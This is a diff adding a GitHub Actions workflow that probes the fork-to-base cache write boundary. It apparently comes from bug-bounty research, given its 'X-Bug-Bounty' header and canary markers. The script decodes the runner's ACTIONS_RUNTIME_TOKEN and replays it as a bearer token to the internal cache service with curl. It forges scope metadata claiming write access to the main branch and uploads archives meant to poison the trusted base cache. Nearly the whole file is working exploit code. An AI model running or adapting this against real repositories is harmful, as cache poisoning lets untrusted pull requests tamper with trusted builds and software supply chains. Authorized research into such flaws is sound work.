@@ -1,0 +1,250 @@
+name: fork-cache-boundary
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: [self-hosted, cp-fork-boundary-20260729]
+    steps:
+      - name: Restore trusted base-branch cache
+        id: base-cache
+        uses: actions/cache/restore@v4
+        with:
+          path: base-cache-marker.txt
+          key: actions-cp-trusted-base-cache-20260729-v1
+
+      - name: Record base-cache read control
+        shell: bash
+        env:
+          CACHE_HIT: ${{ steps.base-cache.outputs.cache-hit }}
+        run: |
+          set -euo pipefail
+          if [ -f base-cache-marker.txt ]; then
+            marker_present=yes
+            marker_sha256="$(shasum -a 256 base-cache-marker.txt | cut -d ' ' -f 1)"
+          else
+            marker_present=no
+            marker_sha256=none
+          fi
+          printf 'FORK_BASE_CACHE_READ cache_hit=%s marker_present=%s marker_sha256=%s\n' \
+            "${CACHE_HIT:-false}" "$marker_present" "$marker_sha256"
+
+      - name: Create fork cache poison canaries
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          printf '%s\n' 'ACTIONS_CP_FORK_STANDARD_CACHE_20260729_a199e73f52' > fork-standard-marker.txt
+          printf '%s\n' 'ACTIONS_CP_FORK_RAW_CACHE_20260729_b586c192ad' > fork-raw-marker.txt
+
+      - name: Save standard fork cache control
+        uses: actions/cache/save@v4
+        with:
+          path: fork-standard-marker.txt
+          key: actions-cp-fork-standard-poison-20260729-v1
+
+      - name: Exercise fork-to-base cache write boundary
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const childProcess = require('child_process')
+            const crypto = require('crypto')
+            const fs = require('fs')
+            const path = require('path')
+
+            const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN
+            if (!runtimeToken) throw new Error('ACTIONS_RUNTIME_TOKEN was not injected into the action process')
+            const payload = runtimeToken.split('.')[1]
+            const claims = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'))
+            const access = JSON.parse(claims.ac)
+            const baseScope = access.find(item => item.Scope === 'refs/heads/main')
+            const writeScope = access.find(item => Number(item.Permission) & 2)
+            const identity = {
+              repository_id: String(claims.repository_id),
+              repository_visibility: String(claims.repository_visibility),
+              ref: String(process.env.GITHUB_REF),
+              event: String(process.env.GITHUB_EVENT_NAME),
+              scopes: access.map(item => ({
+                scope: item.Scope,
+                permission: String(item.Permission)
+              }))
+            }
+            console.log('FORK_CACHE_RUNTIME_IDENTITY ' + JSON.stringify(identity))
+            if (!baseScope || !writeScope) throw new Error('Expected base read scope and pull-request write scope')
+
+            const resultsOrigin = new URL(process.env.ACTIONS_RESULTS_URL).origin
+            const serviceUrl = `${resultsOrigin}/twirp/github.actions.results.api.v1.CacheService`
+            const workDir = path.join(process.env.RUNNER_TEMP, 'fork-cache-boundary')
+            fs.mkdirSync(workDir, {recursive: true, mode: 0o700})
+            const archivePath = path.join(workDir, 'cache.tzst')
+            const manifestPath = path.join(workDir, 'manifest.txt')
+            fs.writeFileSync(manifestPath, 'fork-raw-marker.txt\n', {mode: 0o600})
+            const archive = childProcess.spawnSync('/usr/bin/tar', [
+              '--posix',
+              '-cf', archivePath,
+              '-P',
+              '-C', process.env.GITHUB_WORKSPACE,
+              '--files-from', manifestPath,
+              '--use-compress-program', 'zstdmt'
+            ], {encoding: 'utf8'})
+            if (archive.status !== 0) throw new Error(`Archive creation failed with ${archive.status}`)
+            const archiveSize = fs.statSync(archivePath).size
+            const version = crypto
+              .createHash('sha256')
+              .update('fork-raw-marker.txt|zstd-without-long|1.0')
+              .digest('hex')
+
+            function erase(filePath) {
+              try {
+                fs.writeFileSync(filePath, '', {mode: 0o600})
+                fs.unlinkSync(filePath)
+              } catch {}
+            }
+
+            function twirp(label, method, body) {
+              const suffix = crypto.randomBytes(6).toString('hex')
+              const configPath = path.join(workDir, `twirp-${suffix}.cfg`)
+              const bodyPath = path.join(workDir, `request-${suffix}.json`)
+              const responsePath = path.join(workDir, `response-${suffix}.json`)
+              const config = [
+                'silent',
+                'show-error',
+                'proxy = "http://127.0.0.1:8080"',
+                'header = "Content-Type: application/json"',
+                'header = "X-Bug-Bounty: rez0"',
+                `header = "Authorization: Bearer ${runtimeToken}"`,
+                'user-agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"'
+              ]
+              fs.writeFileSync(configPath, `${config.join('\n')}\n`, {mode: 0o600})
+              fs.writeFileSync(bodyPath, JSON.stringify(body), {mode: 0o600})
+              const result = childProcess.spawnSync('curl', [
+                '--config', configPath,
+                '--request', 'POST',
+                '--data-binary', `@${bodyPath}`,
+                '--output', responsePath,
+                '--write-out', '%{http_code}',
+                `${serviceUrl}/${method}`
+              ], {encoding: 'utf8'})
+              let value = {}
+              try {
+                value = JSON.parse(fs.readFileSync(responsePath, 'utf8'))
+              } catch {}
+              erase(configPath)
+              erase(bodyPath)
+              erase(responsePath)
+              return {
+                status: result.status === 0 ? result.stdout.trim() : `curl-error-${result.status}`,
+                ok: value.ok === true,
+                message: String(value.msg || value.message || '').slice(0, 140),
+                signedUrl: typeof value.signed_upload_url === 'string'
+                  ? value.signed_upload_url
+                  : '',
+                entryId: String(value.entry_id || '')
+              }
+            }
+
+            function upload(signedUrl) {
+              const suffix = crypto.randomBytes(6).toString('hex')
+              const configPath = path.join(workDir, `upload-${suffix}.cfg`)
+              const responsePath = path.join(workDir, `upload-${suffix}.txt`)
+              const config = [
+                'silent',
+                'show-error',
+                'proxy = "http://127.0.0.1:8080"',
+                'request = "PUT"',
+                'header = "Content-Type: application/octet-stream"',
+                'header = "x-ms-blob-type: BlockBlob"',
+                'header = "x-ms-version: 2021-12-02"',
+                'header = "X-Bug-Bounty: rez0"',
+                'user-agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"',
+                `url = "${signedUrl}"`
+              ]
+              fs.writeFileSync(configPath, `${config.join('\n')}\n`, {mode: 0o600})
+              const result = childProcess.spawnSync('curl', [
+                '--config', configPath,
+                '--data-binary', `@${archivePath}`,
+                '--output', responsePath,
+                '--write-out', '%{http_code}'
+              ], {encoding: 'utf8'})
+              erase(configPath)
+              erase(responsePath)
+              return result.status === 0 ? result.stdout.trim() : `curl-error-${result.status}`
+            }
+
+            function createUploadFinalize(label, key, createMetadata, finalizeMetadata) {
+              const createBody = {key, version}
+              if (createMetadata) createBody.metadata = createMetadata
+              const create = twirp(label, 'CreateCacheEntry', createBody)
+              let uploadStatus = 'skipped'
+              let finalize = {status: 'skipped', ok: false, message: '', entryId: ''}
+              let signedHost = ''
+              try {
+                signedHost = create.signedUrl ? new URL(create.signedUrl).hostname : ''
+              } catch {}
+              if (create.ok && create.signedUrl) {
+                uploadStatus = upload(create.signedUrl)
+                const finalizeBody = {
+                  key,
+                  size_bytes: String(archiveSize),
+                  version
+                }
+                if (finalizeMetadata) finalizeBody.metadata = finalizeMetadata
+                finalize = twirp(label, 'FinalizeCacheEntryUpload', finalizeBody)
+              }
+              return {
+                label,
+                create_status: create.status,
+                create_ok: create.ok ? 'yes' : 'no',
+                create_message: create.message,
+                signed_url_present: create.signedUrl ? 'yes' : 'no',
+                signed_host: signedHost,
+                upload_status: uploadStatus,
+                finalize_status: finalize.status,
+                finalize_ok: finalize.ok ? 'yes' : 'no',
+                finalize_message: finalize.message,
+                entry_id_present: finalize.entryId ? 'yes' : 'no'
+              }
+            }
+
+            const baseWriteMetadata = {
+              repository_id: String(claims.repository_id),
+              scope: [{
+                scope: 'refs/heads/main',
+                permission: '3'
+              }]
+            }
+            const mixedMetadata = {
+              repository_id: String(claims.repository_id),
+              scope: [
+                {scope: 'refs/heads/main', permission: '3'},
+                {scope: writeScope.Scope, permission: String(writeScope.Permission)}
+              ]
+            }
+            const results = [
+              createUploadFinalize(
+                'raw_pr_scope_control',
+                'actions-cp-fork-raw-control-20260729-v1',
+                null,
+                null
+              ),
+              createUploadFinalize(
+                'raw_base_scope_forged',
+                'actions-cp-fork-raw-base-forged-20260729-v1',
+                baseWriteMetadata,
+                baseWriteMetadata
+              ),
+              createUploadFinalize(
+                'raw_mixed_scope_forged',
+                'actions-cp-fork-raw-mixed-forged-20260729-v1',
+                mixedMetadata,
+                mixedMetadata
+              )
+            ]
+            console.log('FORK_CACHE_WRITE_BOUNDARY ' + JSON.stringify(results))
+            erase(archivePath)
+            erase(manifestPath)
